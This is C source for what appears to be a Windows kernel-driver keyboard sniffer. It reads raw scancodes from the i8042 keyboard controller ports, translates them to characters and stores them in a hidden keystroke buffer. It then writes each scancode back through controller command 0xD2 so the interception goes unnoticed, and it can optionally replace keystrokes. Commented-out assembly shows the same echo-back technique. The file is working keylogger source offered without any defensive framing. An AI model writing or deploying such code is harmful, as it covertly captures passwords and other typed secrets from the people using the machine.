#include "Kb_sniffMp.h"
#include "KbRelated.h"

extern BOOL bEnableReplace;
extern KSPIN_LOCK KbdLock;
extern unsigned char keystroke_buffer[MAX_CHARS];
PUCHAR KEYBOARD_PORT_60 = (PUCHAR)0x60;
PUCHAR KEYBOARD_PORT_64 = (PUCHAR)0x64;
int kb_array_ptr=0;
int kb_status = S_NUM;
UCHAR schPre =0;
unsigned char asciiTbl[]={
	0x00, 0x1B, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x2D, 0x3D, 0x08, 0x09,	//normal
		0x71, 0x77, 0x65, 0x72, 0x74, 0x79, 0x75, 0x69, 0x6F, 0x70, 0x5B, 0x5D, 0x0D, 0x00, 0x61, 0x73,
		0x64, 0x66, 0x67, 0x68, 0x6A, 0x6B, 0x6C, 0x3B, 0x27, 0x60, 0x00, 0x5C, 0x7A, 0x78, 0x63, 0x76,
		0x62, 0x6E, 0x6D, 0x2C, 0x2E, 0x2F, 0x00, 0x2A, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x38, 0x39, 0x2D, 0x34, 0x35, 0x36, 0x2B, 0x31,
		0x32, 0x33, 0x30, 0x2E,
		0x00, 0x1B, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x2D, 0x3D, 0x08, 0x09,	//caps
		0x51, 0x57, 0x45, 0x52, 0x54, 0x59, 0x55, 0x49, 0x4F, 0x50, 0x5B, 0x5D, 0x0D, 0x00, 0x41, 0x53,
		0x44, 0x46, 0x47, 0x48, 0x4A, 0x4B, 0x4C, 0x3B, 0x27, 0x60, 0x00, 0x5C, 0x5A, 0x58, 0x43, 0x56,
		0x42, 0x4E, 0x4D, 0x2C, 0x2E, 0x2F, 0x00, 0x2A, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x38, 0x39, 0x2D, 0x34, 0x35, 0x36, 0x2B, 0x31,
		0x32, 0x33, 0x30, 0x2E,
		0x00, 0x1B, 0x21, 0x40, 0x23, 0x24, 0x25, 0x5E, 0x26, 0x2A, 0x28, 0x29, 0x5F, 0x2B, 0x08, 0x09,	//shift
		0x51, 0x57, 0x45, 0x52, 0x54, 0x59, 0x55, 0x49, 0x4F, 0x50, 0x7B, 0x7D, 0x0D, 0x00, 0x41, 0x53,
		0x44, 0x46, 0x47, 0x48, 0x4A, 0x4B, 0x4C, 0x3A, 0x22, 0x7E, 0x00, 0x7C, 0x5A, 0x58, 0x43, 0x56,
		0x42, 0x4E, 0x4D, 0x3C, 0x3E, 0x3F, 0x00, 0x2A, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x38, 0x39, 0x2D, 0x34, 0x35, 0x36, 0x2B, 0x31,
		0x32, 0x33, 0x30, 0x2E,
		0x00, 0x1B, 0x21, 0x40, 0x23, 0x24, 0x25, 0x5E, 0x26, 0x2A, 0x28, 0x29, 0x5F, 0x2B, 0x08, 0x09,	//caps + shift
		0x71, 0x77, 0x65, 0x72, 0x74, 0x79, 0x75, 0x69, 0x6F, 0x70, 0x7B, 0x7D, 0x0D, 0x00, 0x61, 0x73,
		0x64, 0x66, 0x67, 0x68, 0x6A, 0x6B, 0x6C, 0x3A, 0x22, 0x7E, 0x00, 0x7C, 0x7A, 0x78, 0x63, 0x76,
		0x62, 0x6E, 0x6D, 0x3C, 0x3E, 0x3F, 0x00, 0x2A, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x38, 0x39, 0x2D, 0x34, 0x35, 0x36, 0x2B, 0x31,
		0x32, 0x33, 0x30, 0x2E
};
//////////////////////////////////////////////////////////////////////////
ULONG WaitForKbRead()
{
	int i = 100;
	UCHAR mychar;

	do
	{
		mychar = READ_PORT_UCHAR( KEYBOARD_PORT_64 );

		KeStallExecutionProcessor(49);

		if(!(mychar & OBUFFER_FULL)) break;
	}
	while (i--);

	if(i) return TRUE;
	return FALSE;
}

ULONG WaitForKbWrite()
{
	int i = 100;
	UCHAR mychar;

	do
	{
		mychar = READ_PORT_UCHAR( KEYBOARD_PORT_64 );

		KeStallExecutionProcessor(49);

		if(!(mychar & IBUFFER_FULL)) break;
	}
	while (i--);

	if(i) return TRUE;
	return FALSE;
}

// using stdcall means that this function fixes the stack before returning (opposite of cdecl)
void __stdcall print_keystroke()
{
	KIRQL OldIrql;
	UCHAR	sch, ch = 0;
	int		off = 0;
    KIRQL oldIrql, currentIrql;
	BOOL bOk;
	BOOL bE0Code = FALSE;
	UCHAR replace = REPLACE_MAKECODE;

	currentIrql = KeGetCurrentIrql();

	if (currentIrql < DISPATCH_LEVEL)
	{
		KeAcquireSpinLock(&KbdLock,&OldIrql);
	}
	//WaitForKbRead();
	do 
	{
		bOk = WaitForKbRead();
	} while(bOk == FALSE);
	
	sch = READ_PORT_UCHAR(KEYBOARD_PORT_60);
	if (sch == 0xE0)
	{
		//WaitForKbRead();
		bE0Code = TRUE;
		do 
		{
			bOk = WaitForKbRead();
		} while(bOk == FALSE);
		sch = READ_PORT_UCHAR(KEYBOARD_PORT_60);
	}

	if (kb_status & S_CAPS)
		off += 0x54;
	if (kb_status & S_SHIFT)
		off += 0x54 * 2;

	if ((sch & 0x80) == 0)	//make
	{
		if ((sch < 0x47) || 
			((sch >= 0x47 && sch < 0x54) && (kb_status & S_NUM))) // Num Lock
		{
			ch = asciiTbl[off+sch];
		}

        if(schPre != sch)
		switch (sch)
		{
		case 0x3A:
			kb_status ^= S_CAPS;
			break;

		case 0x2A:
		case 0x36:
			kb_status |= S_SHIFT;
			break;

		case 0x45:
			kb_status ^= S_NUM;
		}
	}
	else		//break
	{
		if (sch == 0xAA || sch == 0xB6)
			kb_status &= ~S_SHIFT;
	}

	if (ch >= 0x20 && ch < 0x7F && (schPre != sch) && !bE0Code)
	{
		keystroke_buffer[kb_array_ptr++] = ch;
		keystroke_buffer[kb_array_ptr] = '\0';
		if (kb_array_ptr >= MAX_CHARS-1)
		{
			kb_array_ptr = 0;
		}
	}

	//put scancode back (works on PS/2)
	if (schPre != sch && !bE0Code)
	{
		if (bEnableReplace == TRUE)
		{
			if ((sch & 0x80) == 0)
			{
				sch = replace;
			}
			else
			{
				sch = replace | 0x80;
			}
		}
		
		schPre =sch;
		do 
		{
			bOk = WaitForKbWrite();
		} while(bOk == FALSE);
		WRITE_PORT_UCHAR(KEYBOARD_PORT_64, 0xD2); //command to echo back scancode	
		//WaitForKbWrite();
		do 
		{
			bOk = WaitForKbWrite();
		} while(bOk == FALSE);
		WRITE_PORT_UCHAR(KEYBOARD_PORT_60, sch); //write the scancode to echo back
		
		//_SetKbdIo(sch);
	}
	if (currentIrql < DISPATCH_LEVEL)
	{
		KeReleaseSpinLock(&KbdLock,OldIrql);
	}
}
//////////////////////////////////////////////////////////////////////////
//char __stdcall __SetKdbIo(BYTE    KeyScanCode)
//{
//	__asm
//	{
//LoopWaitForKdbOK : 
//
//		in al , 0x64
//
//			;64号端口为AT Keyboard controller 8042芯片的状态/控制端口
//			and al , 2
//			jnz    LoopWaitForKdbOK
//
//			;等待状态端口OK
//			;等待status register 的IBF位为1
//			;就是等待host 到 keyboard的Input Buffer full
//			;参见上资料
//
//			mov    al , 0xD2
//			out 0x64 , al
//
//			;向64端口发送控制命令
//			;0xD2号命令是写键盘output buffer的命令
//			;参考:http://lezy.51.net/sub/i8042.htm
//
//
//LoopWaitForCmdOK:    
//		in    al , 0x64
//			and    al , 2    
//			jnz    LoopWaitForCmdOK
//			;等待命令完成
//			;等待status register 的IBF位为1
//			;就是等待host 到 keyboard的Input Buffer full
//
//			mov    al , KeyScanCode
//
//			;获得要写入的scan code
//
//			out 0x60 , al 
//
//			;60号端口是AT KeyBoard controller 8042的Input/Output Buffer端口
//
//			;向键盘写入一个scan code
//			;相当于一次模拟按键
//	}
//}
//
//char __stdcall _SetKbdIo(BYTE    KeyScanCode)
//{
//	return __SetKdbIo(KeyScanCode);
//}